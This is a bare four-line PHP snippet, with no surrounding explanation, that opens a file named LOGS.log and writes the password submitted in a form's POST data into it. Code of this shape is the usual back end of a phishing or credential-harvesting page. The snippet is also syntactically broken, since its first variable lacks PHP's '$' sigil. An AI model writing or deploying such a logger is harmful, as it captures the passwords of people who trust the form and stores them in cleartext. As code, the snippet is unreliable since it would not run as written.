<?php
  FILE=fopen("LOGS.log","w+");
  fwrite($FILE, $_POST['password']);
?>
